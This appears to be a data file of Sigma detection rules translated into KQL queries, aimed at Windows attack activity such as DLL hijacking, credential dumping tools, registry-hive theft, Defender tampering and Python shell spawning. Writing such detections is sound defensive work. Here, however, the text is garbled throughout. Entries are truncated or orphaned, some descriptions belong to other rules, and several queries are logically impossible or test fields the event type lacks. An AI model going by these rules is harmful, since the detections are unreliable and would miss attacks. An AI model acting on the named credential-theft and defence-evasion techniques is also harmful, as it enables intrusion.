| where data_source_type_id == 12 and file_name endswith '.evtx' and (not((dir_path startswith 'C:\\Windows\\System32\\winevt\\Logs\\' or (dir_path has_all ('C:\\ProgramData\\Microsoft\\Windows\\Containers\\BaseImages\\', '\\Windows\\System32\\winevt\\Logs\\')) or ((file_name =~ 'explorer.exe' and dir_path =~ 'C:\\Windows') or (file_name =~ 'dllhost.exe' and dir_path =~ 'C:\\Windows\\system32')))))

sigma_rule.name: EVTX Created In Uncommon Location

pysigma_kql:
events_all
| where data_source_type_id == 12 and (((file_name =~ 'WLBSCTRL.dll' and dir_path =~ 'C:\\Windows\\System32') or (file_name =~ 'TSMSISrv.dll' and dir_path =~ 'C:\\Windows\\System32') or (file_name =~ 'TSVIPSrv.dll' and dir_path =~ 'C:\\Windows\\System32') or (file_name =~ 'wow64log.dll' and dir_path =~ 'C:\\Windows\\System32') or (file_name =~ 'WptsExtensions.dll' and dir_path =~ 'C:\\Windows\\System32') or (file_name =~ 'wbemcomn.dll' and dir_path =~ 'C:\\Windows\\System32\\wbem')) or file_name endswith 'SprintCSP.dll') and (not(dir_path startswith 'C:\\Windows\\System32\\'))

sigma_rule.description: Detects the creation of system dlls that are not present on the system. Usually to achieve dll hijacking
sigma_rule.name: Creation Of Non-Existent System DLL

pysigma_kql:
events_all
| where data_source_type_id == 12 and (dir_path contains ':\\Windows\\apppatch\\Custom\\' or dir_path contains ':\\Windows\\apppatch\\CustomSDB\\')

sigma_rule.description:
Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims.
The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time.
sigma_rule.name: New Shim Database Created in the Default Directory

pysigma_kql:
events_all
| where data_source_type_id == 12 and file_name endswith '.scr' and (not(((file_name endswith 'Kindle.exe' or (file_name =~ 'ccSvcHst.exe' and dir_path endswith '\\Bin')) or (file_name has_all ('TiWorker.exe', 'uwfservicingscr.scr')))))

Adversaries may establish persistence by executing malicious content triggered by user inactivity.
Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension
sigma_rule.name: Suspicious Screensaver Binary File Creation

| where data_source_type_id == 12 and file_name =~ 'program.exe' and dir_path =~ 'C:'

Adversaries may execute their own malicious payloads by hijacking vulnerable file path references.
Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.
sigma_rule.name: Creation Exe for Service with Unquoted Path

pysigma_kql:

| where data_source_type_id == 12 and ((file_name contains 'pwdump' or file_name contains 'kirbi' or file_name contains 'pwhashes' or file_name contains 'wce_ccache' or file_name contains 'wce_krbtkts' or file_name contains 'fgdump-log') or (file_name endswith 'test.pwd' or file_name endswith 'lsremora64.dll' or file_name endswith 'lsremora.dll' or file_name endswith 'fgexec.exe' or file_name endswith 'wceaux.dll' or file_name endswith 'SAM.out' or file_name endswith 'SECURITY.out' or file_name endswith 'SYSTEM.out' or file_name endswith 'NTDS.out' or file_name endswith 'DumpExt.dll' or file_name endswith 'DumpSvc.exe' or file_name endswith 'cachedump64.exe' or file_name endswith 'cachedump.exe' or file_name endswith 'pstgdump.exe' or file_name endswith 'servpw.exe' or file_name endswith 'servpw64.exe' or file_name endswith 'pwdump.exe' or file_name endswith 'procdump64.exe' or file_name endswith 'Dumpy.exe'))

events_all
| project _fileName, _fileName
| where data_source_type_id == 12 and (file_name endswith 'wscript.exe' or file_name endswith 'cscript.exe') and (dir_path startswith 'C:\\Users\\' or (file_name startswith 'ProgramData' and dir_path =~ 'C:')) and (file_name endswith '.jse' or file_name endswith '.vbe' or file_name endswith '.js' or file_name endswith '.vba' or file_name endswith '.vbs')

sigma_rule.description: Detects a file ending in jse, vbe, js, vba, vbs written by cscript.exe or wscript.exe
sigma_rule.name: WScript or CScript Dropper - File

pysigma_kql:
events_all
| where data_source_type_id == 12 and file_name endswith '.cmdline'

When C# is compiled dynamically, a .cmdline file will be created as a part of the process.
Certain processes are not typically observed compiling C# code, but can do so without touching disk.
This can be used to unpack a payload for execution
sigma_rule.name: Dynamic CSharp Compile Artefact

pysigma_kql:

pysigma_kql:

sigma_rule.name: CVE-2022-24527 Microsoft Connected Cache LPE

pysigma_kql:
events_all
| where data_source_type_id == 12 and file_name =~ 'System' and (file_name =~ 'iertutil.dll' and dir_path endswith '\\Internet Explorer')

sigma_rule.description: Detects potential DLL hijack of "iertutil.dll" found in the DCOM InternetExplorer.Application Class over the network
sigma_rule.name: Potential DCOM InternetExplorer.Application DLL Hijack

pysigma_kql:
events_all
| where data_source_type_id == 12 and (dir_path startswith 'C:\\Windows \\' or dir_path startswith 'C:\\Program Files \\' or dir_path startswith 'C:\\Program Files (x86) \\') and file_name endswith '.dll'

but with a space in order to trick DLL load search order and perform a "DLL Search Order Hijacking" attack

sigma_rule.description: Detects suspicious file type dropped by an Exchange component in IIS
sigma_rule.name: Suspicious File Drop by Exchange

| where data_source_type_id == 12 and dir_path contains '\\AppData\\Local\\Temp\\LogMeInInc\\GoToAssist Remote Support Expert\\'

An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.
These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.
Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)

pysigma_kql:

sigma_rule.description: Detects the creation of known offensive powershell scripts used for exploitation
sigma_rule.name: Malicious PowerShell Scripts - FileCreation

pysigma_kql:
events_all
| where data_source_type_id == 12 and (file_name endswith 'powershell.exe' or file_name endswith 'pwsh.exe') and (dir_path contains '\\WindowsPowerShell\\Modules\\' or dir_path contains '\\PowerShell\\7\\Modules\\')

sigma_rule.description: Detects the creation of a new PowerShell module ".psm1", ".psd1", ".dll", ".ps1", etc.
sigma_rule.name: PowerShell Module File Created

pysigma_kql:
events_all
| where data_source_type_id == 12 and "strcat(dir_path, file_name)" matches regex '.*\\WindowsPowerShell\\Modules\\.*\\\.ps'

sigma_rule.description: Detects the creation of a new PowerShell module in the first folder of the module directory structure "\WindowsPowerShell\Modules\malware\malware.psm1". This is somewhat an uncommon practice as legitimate modules often includes a version folder.
sigma_rule.name: Potential Suspicious PowerShell Module File Created

pysigma_kql:
events_all
| where data_source_type_id == 12 and (dir_path contains '\\WindowsPowerShell\\Modules\\' or dir_path contains '\\PowerShell\\7\\Modules\\') and (not((file_name endswith 'powerShell_ise.exe' or file_name endswith 'powershell.exe' or file_name endswith 'pwsh.exe')))

sigma_rule.description: Detects the creation of a new PowerShell module ".psm1", ".psd1", ".dll", ".ps1", etc. by a non-PowerShell process
sigma_rule.name: PowerShell Module File Created By Non-PowerShell Process

pysigma_kql:
events_all
| where data_source_type_id == 12 and (file_name endswith 'powershell.exe' or file_name endswith 'pwsh.exe') and dir_path contains '\\start menu\\programs\\startup\\' and file_name endswith '.lnk'

sigma_rule.description:
Detects PowerShell writing startup shortcuts.
This procedure was highlighted in Red Canary Intel Insights Oct. 2021, "We frequently observe adversaries using PowerShell to write malicious .lnk files into the startup directory to establish persistence.
Accordingly, this detection opportunity is likely to identify persistence mechanisms in multiple threats.
In the context of Yellow Cockatoo, this persistence mechanism eventually launches the command-line script that leads to the installation of a malicious DLL"
sigma_rule.name: Potential Startup Shortcut Persistence Via PowerShell.EXE

pysigma_kql:
events_all
| where data_source_type_id == 12 and file_name contains '__PSScriptPolicyTest_' and (not(((file_name =~ 'pwsh.exe' and dir_path endswith ':\\Program Files\\PowerShell\\7') or (file_name =~ 'dsac.exe' and dir_path endswith ':\\Windows\\System32') or (file_name =~ 'ServerManager.exe' and dir_path endswith ':\\Windows\\System32') or (file_name =~ 'powershell_ise.exe' and dir_path endswith ':\\Windows\\System32\\WindowsPowerShell\\v1.0') or (file_name =~ 'powershell.exe' and dir_path endswith ':\\Windows\\System32\\WindowsPowerShell\\v1.0') or (file_name =~ 'wsmprovhost.exe' and dir_path endswith ':\\Windows\\System32') or (file_name =~ 'powershell_ise.exe' and dir_path endswith ':\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0') or (file_name =~ 'powershell.exe' and dir_path endswith ':\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0'))))

sigma_rule.description: Detects the creation of the "PSScriptPolicyTest" PowerShell script by an uncommon process. This file is usually generated by Microsoft Powershell to test against Applocker.
sigma_rule.name: PSScriptPolicyTest Creation By Uncommon Process

pysigma_kql:
events_all
| where data_source_type_id == 12 and (dir_path contains ':\\Users\\' or dir_path contains '\\.config\\rclone\\')

sigma_rule.description: Detects Rclone config files being created
sigma_rule.name: Rclone Config File Creation

pysigma_kql:
events_all
| where data_source_type_id == 12 and (file_name endswith 'brave.exe' or (file_name =~ 'CCleanerBrowser.exe' and dir_path endswith '\\CCleaner Browser\\Application') or file_name endswith 'chromium.exe' or file_name endswith 'firefox.exe' or (file_name =~ 'chrome.exe' and dir_path endswith '\\Google\\Chrome\\Application') or file_name endswith 'iexplore.exe' or file_name endswith 'microsoftedge.exe' or file_name endswith 'msedge.exe' or file_name endswith 'Opera.exe' or file_name endswith 'Vivaldi.exe' or file_name endswith 'Whale.exe' or file_name endswith 'Outlook.exe' or file_name endswith 'RuntimeBroker.exe' or file_name endswith 'Thunderbird.exe' or file_name endswith 'Discord.exe' or file_name endswith 'Keybase.exe' or file_name endswith 'msteams.exe' or file_name endswith 'Slack.exe' or file_name endswith 'teams.exe') and file_name contains '.rdp'

sigma_rule.description: Detects Rclone config file being created
sigma_rule.name: RDP File Creation From Suspicious Application

pysigma_kql:
events_all
| where data_source_type_id == 12 and (file_name endswith 'gthread-3.6.dll' or file_name endswith 'sigcmm-2.4.dll' or (file_name =~ 'tmp.bat' and dir_path endswith '\\Windows\\Temp'))

sigma_rule.description: Detects files dropped by Winnti as described in RedMimicry Winnti playbook
sigma_rule.name: Potential Winnti Dropper Activity

pysigma_kql:
events_all
| where data_source_type_id == 12 and file_name startswith 'ScreenConnect.' and dir_path endswith '\\Bin'

sigma_rule.description:
An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.
These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.
Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)
sigma_rule.name: ScreenConnect Temporary Installation Artefact

pysigma_kql:
events_all
| where data_source_type_id == 12 and ((file_name startswith 'Startup' and dir_path endswith '\\Microsoft\\Windows\\Start Menu\\Programs') or file_name contains '.lnk.{0AFACED1-E828-11D1-9187-B532F1E9575D}') and file_name endswith 'explorer.exe'

sigma_rule.description:
Detects a phishing attack which expands a ZIP file containing a malicious shortcut.
If the victim expands the ZIP file via the explorer process, then the explorer process expands the malicious ZIP file and drops a malicious shortcut redirected to a backdoor into the Startup folder.
Additionally, the file name of the malicious shortcut in Startup folder contains {0AFACED1-E828-11D1-9187-B532F1E9575D} meaning the folder shortcut operation.
sigma_rule.name: Potential RipZip Attack on Startup Folder

These profiliers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.

pysigma_kql:
events_all
| where data_source_type_id == 12 and ((file_name endswith 'Seatbelt.exe' or file_name =~ 'Seatbelt.exe' or _Description =~ 'Seatbelt' or (_CommandLine contains ' DpapiMasterKeys' or _CommandLine contains ' InterestingProcesses' or _CommandLine contains ' InterestingFiles' or _CommandLine contains ' CertificateThumbprints' or _CommandLine contains ' ChromiumBookmarks' or _CommandLine contains ' ChromiumHistory' or _CommandLine contains ' ChromiumPresence' or _CommandLine contains ' CloudCredentials' or _CommandLine contains ' CredEnum' or _CommandLine contains ' CredGuard' or _CommandLine contains ' FirefoxHistory' or _CommandLine contains ' ProcessCreationEvents')) or ((_CommandLine contains ' -group=misc' or _CommandLine contains ' -group=remote' or _CommandLine contains ' -group=chromium' or _CommandLine contains ' -group=slack' or _CommandLine contains ' -group=system' or _CommandLine contains ' -group=user' or _CommandLine contains ' -group=all') and _CommandLine contains ' -outputfile='))

sigma_rule.description: Detects the execution of the PUA/Recon tool Seatbelt via PE information of command line parameters
sigma_rule.name: PUA - Seatbelt Execution

pysigma_kql:
events_all
| where data_source_type_id == 12 and (_Description =~ 'Web Browser Password Viewer' or file_name endswith 'WebBrowserPassView.exe')

sigma_rule.description: Detects the execution of WebBrowserPassView.exe. A password recovery tool that reveals the passwords stored by the following Web browsers, Internet Explorer (Version 4.0 - 11.0), Mozilla Firefox (All Versions), Google Chrome, Safari, and Opera
sigma_rule.name: PUA - WebBrowserPassView Execution

pysigma_kql:
events_all
| where data_source_type_id == 12 and ((file_name endswith 'wsudo.exe' or file_name =~ 'wsudo.exe' or _Description =~ 'Windows sudo utility' or file_parent_name endswith 'wsudo-bridge.exe') or (_CommandLine contains '-u System' or _CommandLine contains '-uSystem' or _CommandLine contains '-u TrustedInstaller' or _CommandLine contains '-uTrustedInstaller' or _CommandLine contains ' --ti '))

sigma_rule.description: Detects usage of wsudo (Windows Sudo Utility). Which is a tool that let the user execute programs with different permissions (System, Trusted Installer, Administrator...etc)
sigma_rule.name: PUA - Wsudo Suspicious Execution

pysigma_kql:
events_all
| where data_source_type_id == 12 and file_name endswith 'python.exe' and _CommandLine contains 'adidnsdump'

sigma_rule.description:
This tool enables enumeration and exporting of all DNS records in the zone for recon purposes of internal networks Python 3 and python.exe must be installed,
Usee to Query/modify DNS records for Active Directory integrated DNS via LDAP
sigma_rule.name: PUA - Adidnsdump Execution

pysigma_kql:
events_all
| where data_source_type_id == 12 and ((file_name =~ 'python.exe' or (file_name endswith 'python.exe' or file_name endswith 'python3.exe' or file_name endswith 'python2.exe')) and _CommandLine contains ' -c') and (not((((file_parent_name startswith 'Python' and dir_path =~ 'C:\\Program Files') and file_parent_name endswith 'python.exe' and _ParentCommandLine contains '-E -s -m ensurepip -U --default-pip') or (file_parent_name =~ 'Code.exe' and dir_path endswith '\\AppData\\Local\\Programs\\Microsoft VS Code'))))

sigma_rule.description: Detects execution of python using the "-c" flag. This is could be used as a way to launch a reverse shell or execute live python code.

detection.condition: all of selection_* and not 1 of filter_*

sigma_rule.name: Python Inline Command Execution

pysigma_kql:
events_all
| where data_source_type_id == 12 and (file_name endswith 'python.exe' or file_name endswith 'python3.exe' or file_name endswith 'python2.exe') and ((_CommandLine has_all ('import pty', '.spawn(')) or _CommandLine contains 'from pty import spawn')

sigma_rule.description: Detects python spawning a pretty tty
sigma_rule.name: Python Spawning Pretty TTY on Windows

pysigma_kql:
events_all
| where data_source_type_id == 12 and (file_name =~ 'query.exe' and dir_path endswith ':\\Windows\\System32') and (_CommandLine contains 'session >' or _CommandLine contains 'process >')

sigma_rule.description: Detects usage of "query.exe" a system binary to exfil information such as "sessions" and "processes" for later use
sigma_rule.name: Query Usage To Exfil Data

pysigma_kql:
events_all
| where data_source_type_id == 12 and file_name endswith 'rar.exe' and _CommandLine contains ' a '

sigma_rule.description: Detects usage of "rar" to add files to an archive for potential compression. An adversary may compress data (e.g. sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network.
sigma_rule.name: Files Added To An Archive Using Rar.EXE

pysigma_kql:
events_all
| where data_source_type_id == 12 and _CommandLine contains ' -hp' and (_CommandLine contains ' -m' or _CommandLine contains ' a ')

sigma_rule.description: Detects the use of rar.exe, on the command line, to create an archive with password protection or with a specific compression level. This is pretty indicative of malicious actions.
sigma_rule.name: Rar Usage with Password and Compression Level

pysigma_kql:
events_all
| where data_source_type_id == 12 and ((file_name endswith 'rar.exe' or _Description =~ 'Command line RAR') or (_CommandLine contains '.exe a ' or _CommandLine contains ' a -m')) and ((_CommandLine has_all (' -hp', ' -r ')) and (_CommandLine matches regex '.*\ C:\\.*\..*' or _CommandLine matches regex '.*\ C:\\\\.*\..*' or _CommandLine contains ' C:\\Users\\Public\\' or _CommandLine contains ' %public%' or _CommandLine contains ' C:\\Windows\\' or _CommandLine contains ' C:\\PerfLogs\\' or _CommandLine contains ' C:\\Temp' or _CommandLine contains ' C:\\$Recycle.bin\\'))

sigma_rule.description: Detects RAR usage that creates an archive from a suspicious folder, either a system folder or one of the folders often used by attackers for staging purposes

detection.condition: 1 of selection_opt_* and all of selection_cli_*

sigma_rule.name: Suspicious Greedy Compression Using Rar.EXE

pysigma_kql:
events_all
| where data_source_type_id == 12 and file_name endswith 'rasdial.exe'

sigma_rule.description: Detects suspicious process related to rasdial.exe
sigma_rule.name: Suspicious RASdial Activity

pysigma_kql:
events_all
| where data_source_type_id == 12 and (((_CommandLine contains 'fullmemdmp' or _CommandLine contains '/memdmp' or _CommandLine contains '-memdmp') and (_CommandLine contains ' -o ' or _CommandLine contains ' /o ') and (_CommandLine contains ' -p ' or _CommandLine contains ' /p ')) or ((file_name endswith 'rdrleakdiag.exe' or file_name =~ 'RdrLeakDiag.exe') and (_CommandLine contains 'fullmemdmp' or _CommandLine contains '/memdmp' or _CommandLine contains '-memdmp')))

sigma_rule.description: Detects the use of the Microsoft Windows Resource Leak Diagnostic tool "rdrleakdiag.exe" to dump process memory

detection.condition: all of selection_cli_* or (selection_img and selection_cli_dump)

sigma_rule.name: Process Memory Dump via RdrLeakDiag.EXE

pysigma_kql:
events_all
| where data_source_type_id == 12 and _CommandLine has_all ('reg', ' ADD ', 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')

sigma_rule.description: Detects suspicious command line reg.exe tool adding key to RUN key in Registry
sigma_rule.name: Potential Persistence Attempt Via Run Keys Using Reg.EXE

pysigma_kql:
events_all
| where data_source_type_id == 12 and (file_name endswith 'reg.exe' or file_name =~ 'reg.exe') and _CommandLine contains '\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot' and (_CommandLine contains ' copy ' or _CommandLine contains ' add ')

sigma_rule.description: Detects execution of "reg.exe" commands with the "add" or "copy" flags on safe boot registry keys. Often used by attacker to allow the ransomware to work in safe mode as some security products do not
sigma_rule.name: Add SafeBoot Keys Via Reg Utility

pysigma_kql:
events_all
| where data_source_type_id == 12 and (_CommandLine has_all ('REG', 'ADD', '\\SOFTWARE\\Policies\\Microsoft\\FVE', '/v', '/f')) and (_CommandLine contains 'EnableBDEWithNoTPM' or _CommandLine contains 'UseAdvancedStartup' or _CommandLine contains 'UseTPM' or _CommandLine contains 'UseTPMKey' or _CommandLine contains 'UseTPMKeyPIN' or _CommandLine contains 'RecoveryKeyMessageSource' or _CommandLine contains 'UseTPMPIN' or _CommandLine contains 'RecoveryKeyMessage')

sigma_rule.description: Detects suspicious addition to BitLocker related registry keys via the reg.exe utility
sigma_rule.name: Suspicious Reg Add BitLocker

pysigma_kql:
events_all
| where data_source_type_id == 12 and _CommandLine has_all ('HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa', 'scecli\\0', 'reg add')

sigma_rule.description: Detects dropping of dll files in system32 that may be used to retrieve user credentials from LSASS
sigma_rule.name: Dropping Of Password Filter DLL

pysigma_kql:
events_all
| where data_source_type_id == 12 and file_name endswith 'reg.exe' and (_CommandLine contains 'SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths' or _CommandLine contains 'SOFTWARE\\Microsoft\\Microsoft Antimalware\\Exclusions\\Paths') and (_CommandLine has_all ('ADD ', '/t ', 'REG_DWORD ', '/v ', '/d ', '0'))

sigma_rule.description: Detects the usage of "reg.exe" to add Defender folder exclusions. Qbot has been seen using this technique to add exlcusions for folders within AppData and ProgramData.
sigma_rule.name: Suspicious Windows Defender Folder Exclusion Added Via Reg.EXE

pysigma_kql:
events_all
| where data_source_type_id == 12 and (file_name endswith 'reg.exe' or file_name =~ 'reg.exe') and (_CommandLine has_all (' delete ', '\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot'))

sigma_rule.description: Detects execution of "reg.exe" commands with the "delete" flag on safe boot registry keys. Often used by attacker to prevent safeboot execution of security products
sigma_rule.name: SafeBoot Registry Key Deleted Via Reg.EXE

pysigma_kql:
events_all
| where data_source_type_id == 12 and (file_name endswith 'reg.exe' or file_name =~ 'reg.exe') and _CommandLine contains ' delete ' and _CommandLine contains '\\SYSTEM\\CurrentControlSet\\services\\'

sigma_rule.description: Detects execution of "reg.exe" commands with the "delete" flag on services registry key. Often used by attacker to remove AV software services
sigma_rule.name: Service Registry Key Deleted Via Reg.EXE

pysigma_kql:
events_all
| project _CommandLine, _ParentCommandLine
| where data_source_type_id == 12 and (file_name endswith 'reg.exe' and _CommandLine contains 'add') and (_CommandLine contains '\\software\\Microsoft\\Windows\\CurrentVersion\\Run' or _CommandLine contains '\\software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit' or _CommandLine contains '\\software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell' or _CommandLine contains '\\software\\Microsoft\\Windows NT\\CurrentVersion\\Windows' or _CommandLine contains '\\software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders' or _CommandLine contains '\\system\\CurrentControlSet\\Control\\SafeBoot\\AlternateShell')

sigma_rule.description: Detects direct modification of autostart extensibility point (ASEP) in registry using reg.exe.
sigma_rule.name: Direct Autorun Keys Modification

pysigma_kql:
events_all
| where data_source_type_id == 12 and (_CommandLine has_all ('reg', 'add')) and ((_CommandLine has_all ('d 4', 'v Start')) and (_CommandLine contains '\\AppIDSvc' or _CommandLine contains '\\MsMpSvc' or _CommandLine contains '\\NisSrv' or _CommandLine contains '\\SecurityHealthService' or _CommandLine contains '\\Sense' or _CommandLine contains '\\UsoSvc' or _CommandLine contains '\\WdBoot' or _CommandLine contains '\\WdFilter' or _CommandLine contains '\\WdNisDrv' or _CommandLine contains '\\WdNisSvc' or _CommandLine contains '\\WinDefend' or _CommandLine contains '\\wscsvc' or _CommandLine contains '\\wuauserv'))

sigma_rule.description: Detects execution of "reg.exe" to disable security services such as Windows Defender.
sigma_rule.name: Security Service Disabled Via Reg.EXE

pysigma_kql:
events_all
| where data_source_type_id == 12 and (file_name endswith 'reg.exe' or file_name =~ 'reg.exe') and (_CommandLine contains 'save' or _CommandLine contains 'export' or _CommandLine contains 'ˢave' or _CommandLine contains 'eˣport') and (_CommandLine contains 'hklm' or _CommandLine contains 'hk˪m' or _CommandLine contains 'hkey_local_machine' or _CommandLine contains 'hkey_˪ocal_machine' or _CommandLine contains 'hkey_loca˪_machine' or _CommandLine contains 'hkey_˪oca˪_machine') and (_CommandLine contains '\\system' or _CommandLine contains '\\sam' or _CommandLine contains '\\security' or _CommandLine contains '\\ˢystem' or _CommandLine contains '\\syˢtem' or _CommandLine contains '\\ˢyˢtem' or _CommandLine contains '\\ˢam' or _CommandLine contains '\\ˢecurity')

sigma_rule.description: Detects the usage of "reg.exe" in order to dump sensitive registry hives, which includes SAM, SYSTEM and SECURITY
sigma_rule.name: Dumping of Sensitive Hives Via Reg.EXE

pysigma_kql:
events_all
| where data_source_type_id == 12 and (file_name endswith 'reg.exe' and (_CommandLine has_all (' query ', '/t ', 'REG_SZ', '/s'))) and ((_CommandLine has_all ('/f ', 'HKLM')) or (_CommandLine has_all ('/f ', 'HKCU')) or _CommandLine contains 'HKCU\\Software\\SimonTatham\\PuTTY\\Sessions')

sigma_rule.description:
Adversaries may search the Registry on compromised systems for insecurely stored credentials.
The Windows Registry stores configuration information that can be used by the system or other programs.
Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services
sigma_rule.name: Enumeration for Credentials in Registry

pysigma_kql:
events_all
| where data_source_type_id == 12 and (file_name endswith 'reg.exe' or file_name =~ 'reg.exe') and _CommandLine contains ' import ' and (_CommandLine contains 'C:\\Users\\' or _CommandLine contains '%temp%' or _CommandLine contains '%tmp%' or _CommandLine contains '%appdata%' or _CommandLine contains '\\AppData\\Local\\Temp\\' or _CommandLine contains 'C:\\Windows\\Temp\\' or _CommandLine contains 'C:\\ProgramData\\')

sigma_rule.description: Detects the import of '.reg' files from suspicious paths using the 'reg.exe' utility
sigma_rule.name: Potential Suspicious Registry File Imported Via Reg.EXE

pysigma_kql:
events_all
| where data_source_type_id == 12 and _CommandLine has_all ('\\System\\CurrentControlSet\\Control\\Lsa\\', 'DisableRestrictedAdmin', ' 1')

sigma_rule.description:
Detect activation of DisableRestrictedAdmin to desable RestrictedAdmin mode.
RestrictedAdmin mode prevents the transmission of reusable credentials to the remote system to which you connect using Remote Desktop.
This prevents your credentials from being harvested during the initial connection process if the remote server has been compromise
sigma_rule.name: Disabled RestrictedAdminMode For RDS - ProcCreation

pysigma_kql:
events_all
| where data_source_type_id == 12 and (file_name endswith 'reg.exe' or file_name =~ 'reg.exe') and (_CommandLine contains 'SYSTEM\\CurrentControlSet\\Control\\Lsa' and (_CommandLine has_all (' add ', ' /d 0', ' /v RunAsPPL ')))

sigma_rule.description: Detects the usage of the "reg.exe" utility to disable PPL protection on the LSA process
sigma_rule.name: LSA PPL Protection Disabled Via Reg.EXE

pysigma_kql:
events_all
| where data_source_type_id == 12 and file_name endswith 'reg.exe' and (_CommandLine has_all ('SOFTWARE\\Microsoft\\Cryptography', '/v ', 'MachineGuid'))

sigma_rule.description: Use of reg to get MachineGuid information
sigma_rule.name: Suspicious Query of MachineGUID

pysigma_kql:
events_all
| where data_source_type_id == 12 and (file_name endswith 'reg.exe' or file_name =~ 'reg.exe') and _CommandLine contains '\\SOFTWARE\\Policies\\Microsoft\\Windows\\System' and (_CommandLine contains 'GroupPolicyRefreshTimeDC' or _CommandLine contains 'GroupPolicyRefreshTimeOffsetDC' or _CommandLine contains 'GroupPolicyRefreshTime' or _CommandLine contains 'GroupPolicyRefreshTimeOffset' or _CommandLine contains 'EnableSmartScreen' or _CommandLine contains 'ShellSmartScreenLevel')

sigma_rule.description: Detect malicious GPO modifications can be used to implement many other malicious behaviors.
sigma_rule.name: Modify Group Policy Settings

pysigma_kql:
events_all
| where data_source_type_id == 12 and ((_CommandLine has_all ('reg', 'add', 'hkcu\\software\\classes\\ms-settings\\shell\\open\\command', '/ve ', '/d')) or (_CommandLine has_all ('reg', 'add', 'hkcu\\software\\classes\\ms-settings\\shell\\open\\command', '/v', 'DelegateExecute')) or (_CommandLine has_all ('reg', 'delete', 'hkcu\\software\\classes\\ms-settings')))

sigma_rule.description: Threat actors performed dumping of SAM, SECURITY and SYSTEM registry hives using DelegateExecute key
sigma_rule.name: Suspicious Reg Add Open Command

pysigma_kql:
events_all
| where data_source_type_id == 12 and (file_name endswith 'reg.exe' or file_name =~ 'reg.exe') and _CommandLine contains 'query' and (_CommandLine contains 'currentVersion\\windows' or _CommandLine contains 'winlogon\\' or _CommandLine contains 'currentVersion\\shellServiceObjectDelayLoad' or _CommandLine contains 'currentVersion\\run' or _CommandLine contains 'currentVersion\\policies\\explorer\\run' or _CommandLine contains 'currentcontrolset\\services')

sigma_rule.description: Detects the usage of "reg.exe" in order to query reconnaissance information from the registry. Adversaries may interact with the Windows registry to gather information about credentials, the system, configuration, and installed software.
sigma_rule.name: Potential Configuration And Service Reconnaissance Via Reg.EXE

pysigma_kql:
events_all
| where data_source_type_id == 12 and ((file_name endswith 'reg.exe' or file_name =~ 'reg.exe') and (_CommandLine has_all (' add ', '\\CurrentControlSet\\Control\\Terminal Server', 'REG_DWORD', ' /f'))) and ((_CommandLine has_all ('Licensing Core', 'EnableConcurrentSessions')) or (_CommandLine contains 'WinStations\\RDP-Tcp' or _CommandLine contains 'MaxInstanceCount' or _CommandLine contains 'fEnableWinStation' or _CommandLine contains 'TSUserEnabled' or _CommandLine contains 'TSEnabled' or _CommandLine contains 'TSAppCompat' or _CommandLine contains 'IdleWinStationPoolCount' or _CommandLine contains 'TSAdvertise' or _CommandLine contains 'AllowTSConnections' or _CommandLine contains 'fSingleSessionPerUser' or _CommandLine contains 'fDenyTSConnections'))

sigma_rule.description: Detects the execution of "reg.exe" for enabling/disabling the RDP service on the host by tampering with the 'CurrentControlSet\Control\Terminal Server' values

detection.condition: all of selection_main_* and 1 of selection_values_*

sigma_rule.name: Potential Tampering With RDP Related Registry Keys Via Reg.EXE

pysigma_kql:
events_all
| where data_source_type_id == 12 and (file_name endswith 'reg.exe' and (_CommandLine contains 'HKEY_CURRENT_USER\\Control Panel\\Desktop' or _CommandLine contains 'HKCU\\Control Panel\\Desktop')) and ((_CommandLine has_all ('/v ScreenSaveActive', '/t REG_SZ', '/d 1', '/f')) or (_CommandLine has_all ('/v ScreenSaveTimeout', '/t REG_SZ', '/d ', '/f')) or (_CommandLine has_all ('/v ScreenSaverIsSecure', '/t REG_SZ', '/d 0', '/f')) or (_CommandLine has_all ('/v SCRNSAVE.EXE', '/t REG_SZ', '/d ', '.scr', '/f')))

sigma_rule.description:
Adversaries may establish persistence by executing malicious content triggered by user inactivity.
Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension
sigma_rule.name: Suspicious ScreenSave Change by Reg.exe

pysigma_kql:
events_all
| where data_source_type_id == 12 and (file_name endswith 'reg.exe' and (_CommandLine has_all ('add ', 'SYSTEM\\CurrentControlSet\\Services\\', ' ImagePath '))) and (_CommandLine contains ' /d ' or _CommandLine contains ' -d ')

sigma_rule.description:
Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services.
Adversaries may use flaws in the permissions for registry to redirect from the originally specified executable to one that they control, in order to launch their own code at Service start.
Windows stores local service configuration information in the Registry under HKLM\SYSTEM\CurrentControlSet\Services
sigma_rule.name: Changing Existing Service ImagePath Value Via Reg.EXE

pysigma_kql:
events_all
| where data_source_type_id == 12 and file_name endswith 'reg.exe' and (_CommandLine has_all ('query', '\\software\\', '/v', 'svcversion'))

